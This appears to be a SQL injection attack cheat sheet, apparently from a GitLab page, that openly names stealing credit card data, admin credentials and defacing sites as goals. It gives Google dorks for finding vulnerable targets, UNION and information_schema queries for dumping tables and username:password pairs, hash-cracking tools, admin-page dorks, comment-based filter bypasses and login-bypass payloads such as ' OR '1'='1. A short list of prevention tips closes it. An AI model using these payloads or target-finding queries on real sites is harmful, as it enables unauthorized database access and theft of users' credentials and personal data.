SQL Injection (ByPass)
Basic Information

SQL Injection (SQLi) is a common vulnerability found in web applications, particularly in database-driven features. It arises from improper handling of user inputs in SQL queries, potentially allowing attackers to manipulate queries to gain unauthorized access to databases or extract sensitive information.

Key Facts:

Target Area: Database sections of websites.

Prevalence: Very high; even small websites with simple features like user registration can be vulnerable.

Hacker Usage: Widely exploited for malicious purposes, ranging from data theft to website defacement.

Goals of Exploitation:

Stealing private user information, such as credit card details.

Obtaining admin credentials for unauthorized access.

Defacing websites by altering content.

Popular SQL Databases:

MySQL

MsSQL

Oracle

MsAccess

Identifying Vulnerability

If the site loads without changes: No vulnerability

If a blank or altered page appears: Potential vulnerability

If specific elements fail to load (e.g., images): Potential vulnerability

Any visible changes in the site's appearance can indicate a vulnerability.

Google Dorks for SQLi Detection

Use the following search queries to identify potential targets:

inurl:News.php?id=

inurl:pages.php?id=

inurl:page.php?id=

inurl:gallery.php?id=

inurl:site.php?id=

inurl:php?id=

inurl:id=

Testing for SQLi Vulnerability

Steps:

Determine Columns:

UNION SELECT 1,2,3,4,5,6,7--

Retrieve Version and Database Name:

SELECT VERSION();
SELECT DATABASE();

Example Targets:

http://example.com/news_more.php?id=47

http://example.com/readnews.php?id=2

Extracting Sensitive Data

Retrieve Table Names:

SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--

Common table names:

admin

users

administrator

Extract Data from Admin Table:

SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='admin'--

Retrieve user credentials:

SELECT group_concat(username,0x3a,password) FROM admin--

Tools for Cracking Hashes

Hashes like MD5 can be cracked using:

Online Tools:

Hashkiller

MD5 Cracker

CrackStation

Software:

Havij

Kali Linux

Sample Hashes:

167051a218248afe9094ac97e60134e0

6818dc65c95ade5460170bdebe861137

Finding Admin Pages

Use tools like Havij or Google search with queries:

inurl:/admin

inurl:/login

intitle:admin login

intitle:login page

Common CMS Admin Paths:

WordPress: /wp-login.php

Joomla: /administrator

Example:

http://example.com/admin/login.php

SQLi Bypass Techniques

Bypass ORDER BY or GROUP BY:

?id=10' ORDER BY column_number--
?id=10' GROUP BY column_number--

Bypass with Comments:

?id=10 /*!50000SELECT*/ group_concat(table_name)--

Master Password Injection Techniques

' OR '1=1--

' OR ''='

' OR '1'='1

Example Targets:

http://example.com/admin/login.php

Notes for Secure Handling in GitLab:

Always validate and sanitize user inputs.

Use prepared statements and parameterized queries.

Regularly scan for vulnerabilities using tools like Acunetix or OWASP ZAP.

Educate your development team on secure coding practices.

For detailed implementation, refer to the OWASP SQL Injection Prevention Cheat Sheet.

